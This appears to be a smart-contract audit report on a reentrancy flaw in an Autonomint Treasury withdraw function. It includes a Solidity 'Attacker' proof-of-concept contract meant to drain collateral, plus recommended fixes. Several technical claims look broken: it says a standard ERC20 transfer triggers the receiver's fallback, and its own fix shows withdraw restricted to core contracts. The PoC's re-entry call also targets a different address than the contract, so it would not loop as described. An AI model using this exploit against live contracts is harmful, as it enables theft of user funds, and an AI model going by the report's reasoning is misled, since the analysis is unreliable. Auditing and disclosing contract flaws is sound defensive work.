# Risk of Reentrancy Attacks in Withdraw Functions

# Summary
https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/Treasury.sol#L226-L276
A reentrancy attack in withdraw function occurs when a malicious user exploits a vulnerability in the smart contract by recursively calling the withdraw function before the contract's state is updated. This can allow the attacker to withdraw more funds than they are entitled to, draining the contract's balance.
# Vulnerability Details
The provided withdraw function has a reentrancy vulnerability that could be exploited by attackers to repeatedly withdraw collateral, potentially draining the contract's funds. This occurs due to the external call (call{value: amount}("")) made before updating the internal state of the contract, specifically the depositDetails struct and the total volume tracking variables.

Vulnerable Code Sections:
Collateral Transfer before State Update: In the section where the function transfers collateral to the user:
```solidity

if (depositDetails.assetName == IBorrowing.AssetName.ETH) {
    // Send the ETH to Borrower
    (bool sent, ) = payable(toAddress).call{value: amount}("");
    require(sent, "Failed to send Collateral");
} else {
    uint256 upside = ((depositDetails.depositedAmountInETH * 50) / 100) - amount;
    uint256 upsideToDeduct = (upside * 1 ether) / exchangeRate;
    // Transfer collateral to user
    bool sent = IERC20(borrow.assetAddress(depositDetails.assetName)).transfer(toAddress, depositDetails.depositedAmount - upsideToDeduct);
    // check the transfer is successfull or not
    require(sent, "Failed to send Collateral");
}
```
The external call to transfer the collateral is made before the contract updates the internal state (e.g., depositedAmount, depositedAmountInETH). This means an attacker can exploit this sequence of operations.
### How the Attack Works:
The attacker calls the withdraw function, passing their own contract as the toAddress.
Upon receiving the withdrawal request, the contract sends ETH or token collateral to the attacker’s contract using call{value: amount}("") (for ETH) or IERC20().transfer(toAddress) (for ERC20 tokens).
The attacker's contract contains a fallback function or receive function, which is triggered immediately upon receiving the funds.
In the fallback function, the attacker’s contract calls the withdraw function again, withdrawing more funds before the internal state (such as depositedAmount, depositedAmountInETH, and totalBorrowedAmount) is updated.
This results in a reentrant call where the attacker can withdraw more funds than they are entitled to, continuing until the contract’s balance is drained.
# Impact
Total Loss of Funds
Loss of Collateral
### Severity: High. 
The reentrancy vulnerability allows an attacker to repeatedly withdraw funds, which can drain the contract's balance, causing significant financial loss.
### Likelihood: High.
 The use of external calls before state updates makes the contract prone to reentrancy attacks, particularly if the attacker controls a malicious contract that can trigger the fallback function.
# PoC
The malicious contract will:

Call the withdraw function in the target contract to trigger the collateral transfer.
When the collateral is sent, the fallback function will be triggered, which will call the withdraw function again before the state is updated, allowing the attacker to drain funds.
```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITarget {
    function withdraw(address borrower, address toAddress, uint256 amount, uint128 exchangeRate, uint64 index) external payable returns (bool);
}

contract Attacker {
    ITarget public targetContract; // Address of the target contract
    address public borrower;       // Borrower address whose collateral will be withdrawn
    address public maliciousAddress; // Attacker's address to receive the funds

    constructor(address _targetContract, address _borrower, address _maliciousAddress) {
        targetContract = ITarget(_targetContract);
        borrower = _borrower;
        maliciousAddress = _maliciousAddress;
    }

    // Fallback function to trigger reentrancy
    fallback() external payable {
        uint256 amountToWithdraw = 1 ether; // Set the withdrawal amount for the attack
        // Call withdraw again during the reentrancy to drain more funds
        targetContract.withdraw(borrower, maliciousAddress, amountToWithdraw, 1, 0);
    }

    // Function to initiate the attack
    function attack(uint256 amountToWithdraw) external {
        uint128 exchangeRate = 1;  // Exchange rate (set as 1 for simplicity)
        uint64 index = 0;          // Deposit index (adjust as needed)

        // Call withdraw function on the target contract, this triggers the fallback function
        targetContract.withdraw(borrower, address(this), amountToWithdraw, exchangeRate, index);
    }

    // Function to collect stolen funds
    function collectFunds() external {
        payable(maliciousAddress).transfer(address(this).balance);
    }

    // Helper to receive ETH from the target contract
    receive() external payable {}
}
```
# Recommendations
### Checks-Effects-Interactions Pattern:
The contract should update the internal state before making any external calls or transferring funds. This ensures that any changes to state variables (such as depositedAmount, depositedAmountInETH, and total collateral values) are finalized before external interaction.
Updated code would look like this:

```solidity

// Update the internal state first
depositedCollateralAmountInUsd[depositDetails.assetName] -= depositDetails.depositedAmountUsdValue;
depositedCollateralAmountInWei[depositDetails.assetName] -= depositDetails.depositedAmountInETH;
totalVolumeOfBorrowersAmountinUSD -= depositDetails.depositedAmountUsdValue;
totalVolumeOfBorrowersAmountinWei -= depositDetails.depositedAmountInETH;
borrowing[borrower].totalBorrowedAmount -= depositDetails.borrowedAmount;
borrowing[borrower].depositedAmountInETH -= depositDetails.depositedAmountInETH;

// Transfer collateral after internal state is updated
if (depositDetails.assetName == IBorrowing.AssetName.ETH) {
    (bool sent, ) = payable(toAddress).call{value: amount}("");
    require(sent, "Failed to send Collateral");
} else {
    uint256 upside = ((depositDetails.depositedAmountInETH * 50) / 100) - amount;
    uint256 upsideToDeduct = (upside * 1 ether) / exchangeRate;
    bool sent = IERC20(borrow.assetAddress(depositDetails.assetName)).transfer(toAddress, depositDetails.depositedAmount - upsideToDeduct);
    require(sent, "Failed to send Collateral");
}
```
### Reentrancy Guard:

Use a reentrancy guard to ensure that the function cannot be called multiple times during the same transaction. Example:
```solidity

bool private locked = false;

modifier nonReentrant() {
    require(!locked, "No reentrancy allowed");
    locked = true;
    _;
    locked = false;
}

function withdraw(
    address borrower,
    address toAddress,
    uint256 amount,
    uint128 exchangeRate,
    uint64 index
) external payable onlyCoreContracts nonReentrant returns (bool) {
    // Function logic here
}
```
Use Pull Payments:

Instead of directly transferring funds to users, a safer approach is to use pull payments where users can explicitly request their funds after the state has been updated.
